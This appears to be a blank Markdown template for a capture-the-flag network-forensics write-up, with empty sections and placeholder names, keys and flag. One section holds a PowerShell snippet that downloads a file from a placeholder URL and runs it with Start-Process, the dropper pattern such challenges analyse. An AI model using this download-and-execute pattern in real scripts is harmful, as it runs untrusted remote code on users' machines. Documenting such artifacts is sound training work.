# 🕵️‍♂️ <CTF_NAME> - <CHALLENGE_NAME>

---

## 📘 Challenge Overview

---

## 🔍 Initial Network Analysis

---

## 📦 Suspicious File Transfers

```powershell
$URL = "<URL>";
$Download_PATH = "<Download_Path>";
Invoke-WebRequest -Uri $URL -OutFile $Download_PATH;
$downloader = New-Object System.Net.WebClient;
$downloader.DownloadFile($URL, $Download_PATH);
Start-Process -Filepath $Download_PATH
```


---

## 🔥 Malware Detection

---

## 🧠 Research & C2 Decryption

```bash
[+] Key: <AES_KEY>
[+] IV: <AES_IV>
```

---

## 🛠️ Automation via Bash Script


---

## ✅ Outcome

---

## 🧰 Tools Used

---

## 📂 Artifacts

---

## ✍️ Notes

---

> 🏁 *Flag successfully retrieved: `<flag>`*